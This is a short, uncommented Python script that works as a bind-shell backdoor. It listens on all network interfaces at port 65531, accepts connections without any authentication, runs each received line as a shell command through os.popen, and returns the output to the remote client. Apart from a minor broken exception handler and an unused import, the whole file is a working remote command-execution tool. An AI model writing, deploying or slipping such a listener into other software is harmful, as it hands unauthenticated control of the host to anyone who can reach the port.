import socket
import requests
import os
from threading import Thread

def exec(cmd, connection):
	try:
		output = os.popen(cmd).read()
		connection.send(output.encode("utf-8") + "\n\rcmd: ".encode("utf-8"))
	except Exception as e:
		connection.send(e.encode("utf-8") + "\n\rcmd: ".encode("utf-8"))
	


def lists(connection):
	while True:
		cmd = connection.recv(1024).decode("utf-8")
		exec(cmd, connection)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = '0.0.0.0'
port = 65531
sock.bind((host, port))
sock.listen(5)
while True:
    connection,address = sock.accept()
    connection.send("\n\rcmd: ".encode("utf-8"))
    Thread(target=lists, args=(connection,)).start()
